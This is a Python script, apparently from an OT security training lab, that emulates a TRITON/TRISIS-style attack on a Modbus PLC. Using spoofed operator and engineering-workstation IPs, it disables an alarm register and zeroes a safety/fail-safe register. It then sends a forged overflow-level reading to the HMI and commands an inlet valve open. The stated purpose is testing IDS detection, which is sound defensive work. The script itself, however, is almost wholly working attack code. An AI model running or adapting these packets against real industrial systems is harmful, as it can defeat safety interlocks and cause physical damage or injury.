#!/usr/bin/env python3
"""
OT Security Lab - Adversary Emulation: TRITON/TRISIS-style scenario.

Emulates an actor targeting the SAFETY system (the classic TRITON playbook):
spoofed operator IPs are used to bypass source allow-lists while the actor
manipulates safety/fail-safe registers (alarm suppression, safe-state
override) and then issues a dangerous process command.

Detection expectations (gateway IDS):
  - PROCESS_SAFETY_VIOLATION (T0836) - unsafe valve command at high level
  - UNAUTHORIZED_MODBUS_WRITE (T0831) - writes from spoofed non-operator source
"""
import time

from scapy.all import IP, TCP, Raw, send

PLC = "172.21.0.10"
HMI = "172.22.0.10"
EWS = "172.23.0.4"
MODBUS_PORT = 502

SAFETY_REGISTER = 8      # safety/fail-safe configuration register
ALARM_REGISTER = 7       # alarm enable register
INLET_VALVE_REG = 0
TANK_LEVEL_REG = 5


def modbus_packet(src, dst, function_code, payload):
    mbap = b"\x00\x01\x00\x00\x00\x06\x01"
    return IP(src=src, dst=dst) / TCP(dport=MODBUS_PORT) / Raw(load=mbap + bytes([function_code]) + payload)


print("--- TRITON-STYLE ADVERSARY EMULATION ---")
print(f"Target: {PLC} (safety-relevant registers)")

# Step 1: Alarm suppression - disable alarm register (authorized-looking EWS)
print("[STEP 1] Suppressing alarms (spoofed EWS source)...")
send(modbus_packet(EWS, PLC, 6, ALARM_REGISTER.to_bytes(2, "big") + b"\x00\x00"), verbose=False)
time.sleep(1)

# Step 2: Tamper with safety/fail-safe register (spoofed HMI source)
print("[STEP 2] Overriding safety/fail-safe register (spoofed HMI source)...")
send(modbus_packet(HMI, PLC, 6, SAFETY_REGISTER.to_bytes(2, "big") + b"\x00\x00"), verbose=False)
time.sleep(1)

# Step 3: Inject dangerous process state (tank at overflow level)
print("[STEP 3] Injecting overflow-level process state...")
mbap_resp = b"\x00\x01\x00\x00\x00\x0f\x01"
fc_resp = b"\x03\x0c"
reg_data = b"\x00\x00" * 5 + b"\x00\x5f"  # level = 95
send(IP(src=PLC, dst=HMI) / TCP(sport=MODBUS_PORT, dport=45000) / Raw(load=mbap_resp + fc_resp + reg_data), verbose=False)
time.sleep(1)

# Step 4: Issue the unsafe command - open inlet valve at overflow level
print("[STEP 4] Issuing unsafe OPEN VALVE command...")
send(modbus_packet(HMI, PLC, 6, INLET_VALVE_REG.to_bytes(2, "big") + b"\x00\x01"), verbose=False)

print("--- EMULATION COMPLETE. Review detection/logs/alerts.json. ---")
